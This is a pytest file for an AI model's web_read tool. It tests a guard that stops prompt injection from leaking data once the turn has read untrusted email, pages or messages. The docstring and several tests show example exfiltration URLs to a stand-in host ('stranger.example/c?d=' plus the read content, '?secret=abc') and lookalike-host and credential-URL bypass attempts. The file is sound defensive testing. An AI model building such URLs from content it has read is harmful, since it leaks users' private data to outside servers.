"""
After reading something untrusted, web_read could be pointed at any URL.

An independent review of today's work found the one outbound channel the
injection guard still left open: with the turn tainted (Jalen has just read
an email, a page or a message), web_read("https://stranger.example/c?d=" +
whatever was just read) was allowed - GREEN, no announcement, no length
limit - and the stranger's server receives it. open_url and browse_to were
already refused under taint for exactly this reason; web_read was exempt
because multi-page research is exactly "read, then read the next page".

THE RULE NOW, inside web_read: once the turn is tainted, an address is only
fetched if it appeared VERBATIM in text Jalen has read this turn (a search
result, a link in an email) - or is a plain reference page (no query, no
fragment, no credentials, short) on a short allow-list of hosts that no
stranger controls, set in config/safety.yaml. The model can still follow
what it was shown; it cannot build a new address out of what it read.
A clean turn (he typed or said the address himself) is unrestricted.
"""
from __future__ import annotations

import pytest

from jalen import taint
from jalen.tools import research

from test_web_read_is_bounded import _Resp, net  # noqa: F401 - the fixture


@pytest.fixture(autouse=True)
def _clean_turn():
    taint.he_asked_again()
    yield
    taint.he_asked_again()


def _page(text="<html><title>t</title><p>hello</p></html>"):
    return _Resp(body=text.encode())


def test_an_address_built_from_what_was_read_is_refused_after_a_read(net):
    taint.mark("email from someone", "see https://stranger.example/start")
    net.responses = [_page()]
    out = research.web_read("https://stranger.example/c?d=" + "x" * 300)
    assert net.seen_urls == [], "the stranger's server was contacted"
    assert "BEGIN UNTRUSTED CONTENT" not in out
    assert "yourself" in out.lower()


def test_an_address_that_only_shares_a_host_with_what_was_read_is_refused(net):
    taint.mark("page", "go to https://stranger.example/start")
    net.responses = [_page()]
    research.web_read("https://stranger.example/start?secret=abc")
    assert net.seen_urls == []


def test_an_address_printed_in_what_was_read_is_followed(net):
    taint.mark("email from someone", "the article is at https://news.example/story-1.")
    net.responses = [_page("<html><title>Story</title><p>the story</p></html>")]
    out = research.web_read("https://news.example/story-1")
    assert "the story" in out
    assert net.seen_urls == ["https://news.example/story-1"]


@pytest.mark.parametrize("seen, asked", [
    ("see (https://news.example/a?id=7).", "https://news.example/a?id=7"),
    ("link: https://news.example/a/", "https://news.example/a"),
    ("link: HTTPS://News.Example/a", "https://news.example/a"),
    ("link: http://news.example/a", "https://news.example/a"),
    ("link: https://news.example/a#section", "https://news.example/a"),
])
def test_the_same_address_spelled_a_little_differently_still_counts(net, seen, asked):
    taint.mark("page", seen)
    net.responses = [_page()]
    research.web_read(asked)
    assert net.seen_urls, f"{asked!r} was refused although {seen!r} showed it"


def test_search_results_are_followable(net):
    """The core research flow: search, then read a result."""
    body = ('<a class="result__a" href="https://example.org/paper">A paper</a>'
            '<a class="result__snippet">about things</a>')
    net.responses = [_page(body), _page("<html><title>P</title><p>paper text</p></html>")]
    research.web_search("a topic")
    assert taint.is_tainted()
    out = research.web_read("https://example.org/paper")
    assert "paper text" in out


@pytest.mark.parametrize("url", [
    "https://en.wikipedia.org/wiki/Transformer_(deep_learning_architecture)",
    "https://arxiv.org/abs/1706.03762",
])
def test_a_plain_reference_page_needs_no_earlier_sighting(net, url):
    taint.mark("page", "nothing useful here")
    net.responses = [_page("<html><title>R</title><p>reference</p></html>")]
    assert "reference" in research.web_read(url)


@pytest.mark.parametrize("url", [
    "https://arxiv.org/abs/1706.03762?d=" + "k" * 80,
    "https://en.wikipedia.org/wiki/X#" + "k" * 80,
    "https://user:pw@en.wikipedia.org/wiki/X",
    "https://en.wikipedia.org/wiki/" + "k" * 400,
    "https://en.wikipedia.org.stranger.example/wiki/X",
])
def test_the_allowlist_carries_no_data_and_no_lookalikes(net, url):
    taint.mark("page", "nothing useful here")
    net.responses = [_page()]
    research.web_read(url)
    assert net.seen_urls == [], url


def test_a_clean_turn_is_unrestricted(net):
    net.responses = [_page("<html><title>t</title><p>fine</p></html>")]
    assert "fine" in research.web_read("https://anything.example/with?any=query")


def test_him_speaking_again_forgets_what_was_seen(net):
    taint.mark("page", "https://news.example/a")
    taint.he_asked_again()
    assert not taint.url_was_read("https://news.example/a")


def test_every_fence_that_makes_text_untrusted_also_records_its_addresses():
    """A fence that tainted the turn without recording its links would turn
    'read my email and open the link in it' into a refusal."""
    import inspect

    from jalen.tools import devwork, gmail, messaging

    # Every door untrusted text comes through. messaging._fence is the Telegram
    # door (reads, searches, voice-note transcripts, sticker pack titles); it
    # marked the turn without passing its text until 2026-10-01, so a link in a
    # message he asked to have read was refused as "not shown".
    for fn in (research._fence, gmail._fence, devwork._fence, messaging._fence):
        assert "taint.mark(source, " in inspect.getsource(fn), fn.__qualname__


def test_a_link_in_a_coding_jobs_output_can_be_followed_after_reading_it(net):
    """The coding-job fence records its addresses like the others."""
    from jalen.tools import devwork

    devwork._fence("see the docs at https://docs.example/guide for details", "coding job", "output")
    net.responses = [_page("<html><title>Guide</title><p>the guide text</p></html>")]
    assert "the guide text" in research.web_read("https://docs.example/guide")
